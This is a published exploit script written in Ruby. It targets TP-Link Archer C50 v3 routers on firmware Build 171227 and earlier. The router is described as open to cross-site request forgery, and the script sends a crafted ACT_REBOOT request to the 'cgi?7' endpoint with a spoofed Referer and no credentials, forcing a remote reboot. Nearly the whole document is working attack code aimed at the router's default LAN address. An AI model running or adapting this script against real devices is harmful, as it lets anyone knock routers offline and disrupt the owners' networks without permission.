# Exploit Title: TP-Link C50 Wireless Router 3 - Cross-Site Request Forgery (Remote Reboot)
# Date: 2018-08-09
# Exploit Author: Wadeek
# Vendor Homepage: https://www.tp-link.com/
# Hardware Version: Archer C50 v3 00000001
# Firmware Link: https://www.tp-link.com/download/Archer-C50_V3.html#Firmware
# Firmware Version: <= Build 171227


#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
url = "http://192.168.0.1:80/"
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

require('mechanize')
agent = Mechanize.new()

def reboot(agent, url, path, query)
begin
	response = agent.post(url+path, query, {
		"User-Agent" => "",
		"Accept" => "*/*",
		"Referer" => "http://192.168.0.1/mainFrame.htm",
		"Content-Type" => "text/plain",
		"Connection" => "keep-alive",
		"Cookie" => ""
	})
rescue Exception => e
	begin
		puts(e.inspect())
		puts(e.page().body())
	rescue
	end
	puts("")
else
	puts(path)
	puts(response.body())
	puts("")
end
end

#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
reboot(agent, url, "cgi?7", "[ACT_REBOOT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n")
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!